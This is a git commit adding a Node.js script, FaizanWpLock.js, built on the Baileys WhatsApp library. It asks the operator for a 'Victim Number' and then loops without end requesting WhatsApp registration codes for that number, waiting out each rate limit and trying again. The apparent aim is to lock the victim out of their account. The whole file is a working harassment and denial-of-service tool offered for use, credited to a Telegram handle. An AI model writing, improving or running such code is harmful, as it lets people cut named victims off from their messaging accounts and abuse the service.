93fc2cfc92d1f0e0f449bb2aba10c2ecfa160d23
Faizan Khan <156709479+Faizan-Khanx@users.noreply.github.com>
2024-07-10 23:51:17 +0530

    Add files via upload

---
+++ FaizanWpLock.js
@@ -0,0 +1,62 @@
+const prompt = require('prompt-sync')();
+const gradient = require('gradient-string');
+const pino = require('pino');
+const fs = require('fs')
+// Made With Love By Faizan Khan
+// t.me/sedxjerryhack
+
+const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
+
+const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));
+
+const start = async () => {
+
+  const { state, saveCreds } = await useMultiFileAuthState('.oiii')
+
+  const spam = makeWaSocket({
+    auth: state,
+    mobile: true,
+    logger: pino({ level: 'silent' })
+  })
+  //console.clear();
+  const dropNumber = async (context) => {
+    const { phoneNumber, ddi, number } = context;
+    while (true) {
+    //console.clear();
+      try {
+      //console.log(gradient('red', 'red')('💀■■■■■■■💀 +' + ddi + number))
+      console.clear();
+      console.log(gradient('red', 'blue')('💀Number Locking by @SedxJerryHack +' + ddi + number))
+        res = await spam.requestRegistrationCode({
+          phoneNumber: '+' + phoneNumber,
+          phoneNumberCountryCode: ddi,
+          phoneNumberNationalNumber: number,
+          phoneNumberMobileCountryCode: 724
+        })
+        b = (res.reason === 'temporarily_unavailable');
+        if (b) {
+          //console.log(gradient('gray', 'gray')(`Número derrubado: +${res.login}`));
+          setTimeout(async () => {
+            dropNumber(context)
+          }, res.retry_after * 1000)
+          return;
+        }
+      } catch (error) {
+        //console.log(error)
+      }
+    }
+
+  }
+  console.clear();
+  console.log(gradient('black', 'black')('■'))
+  console.log(gradient('black', 'black')('■'))
+  console.log(gradient('black', 'black')('■'))
+  let ddi = prompt(gradient('purple', 'cyan')('[+] Enter Your Country Code Without + : '));
+  let number = prompt(gradient('purple', 'cyan')('[+] Enter Victim Number : '))
+  let phoneNumber = ddi + number;
+  numbers[phoneNumber] = { ddi, number }
+  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
+  dropNumber({ phoneNumber, ddi, number })
+console.clear();
+}
+start();
